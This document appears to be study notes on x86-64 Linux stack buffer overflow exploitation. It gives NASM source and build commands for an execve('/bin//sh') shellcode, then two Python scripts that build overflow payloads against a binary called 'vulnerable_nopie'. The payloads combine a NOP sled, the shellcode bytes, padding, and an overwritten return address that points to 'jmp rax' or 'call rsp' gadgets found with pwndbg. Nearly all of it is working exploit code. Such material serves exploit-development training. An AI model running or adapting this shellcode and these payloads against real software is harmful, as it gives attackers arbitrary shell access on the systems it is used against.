# execve

## nasm

```bash
nasm -o execve.o -f elf64 execve.nasm
ld -o execve execve.o
objcopy -O binary -j .text execve.o execve.bin
xxd -i -n code ./execve.bin >execve.include
```

```nasm
section .text
global _start
_start:
	xor rax, rax
	push rax                    ; '\0'
	mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
	push rbx
	push rsp
	pop rdi                     ; arg1: "/bin//sh\0"
	xor rsi, rsi                ; arg2: NULL
	xor rdx, rdx                ; arg3: NULL
	mov al, 59                  ; execve("/bin//sh", NULL, NULL);
	syscall
```

## exploit code

### jmp rax exploit

```python
#!/usr/bin/env python3
import sys
shellcode = bytes([
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
  0x73, 0x68, 0x53, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0,
  0x3b, 0x0f, 0x05
])
nops = b'\x90'*32
# canonial: 0x0000_0000_0000_0000 - 0x0000_7fff_ffff_ffff
#
# <jmp rax exploit>
# pwndbg> search --asm 'jmp rax'
#
# libc.so.6       0x7ffff7e09bb8 jmp rax
# addr_sc = 0x7ffff7e09bb8  # jmp rax
#
# vulnerable_nopie 0x4010cc jmp rax
addr_sc = 0x4010cc  # jmp rax
offset = 256
junk = nops
junk += shellcode
junk += b'A'*(offset-len(nops)-len(shellcode))
junk += b'B'*8  # RBP
junk += addr_sc.to_bytes(8, 'little')  # RIP
sys.stdout.buffer.write(junk)
```

### jmp rsp exploit

```
#!/usr/bin/env python3
import sys
shellcode = bytes([
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
  0x73, 0x68, 0x53, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0,
  0x3b, 0x0f, 0x05
])
nops = b'\x90'*32
# canonial: 0x0000_0000_0000_0000 - 0x0000_7fff_ffff_ffff
#
# <jmp rsp exploit>
# pwndbg> search --asm 'jmp rsp'
# libc.so.6       0x7ffff7ddf916 jmp rsp
# addr_sc = 0x7ffff7ddf916  # jmp rsp
#
# pwndbg> search --asm 'call rsp'
# libc.so.6       0x7ffff7dcc34e call rsp
addr_sc = 0x7ffff7dcc34e  # call rsp
offset = 256
junk = b'A'*offset
junk += b'B'*8  # RBP
junk += addr_sc.to_bytes(8, 'little')  # RIP
junk += nops
junk += shellcode
sys.stdout.buffer.write(junk)
```
